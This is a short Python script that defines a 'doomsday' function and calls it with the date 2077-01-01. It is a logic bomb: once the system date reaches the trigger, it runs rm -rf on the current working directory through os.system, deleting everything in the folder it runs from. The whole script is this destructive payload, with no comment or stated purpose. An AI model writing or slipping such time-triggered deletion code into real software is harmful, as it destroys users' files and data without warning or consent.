from os import system, getcwd
from datetime import datetime

def doomsday(y,m,d):
    if datetime.now().date() >= datetime(y,m,d).date():
        system("rm -rf {}".format(getcwd()))

if __name__ == "__main__":
    doomsday(2077,1,1)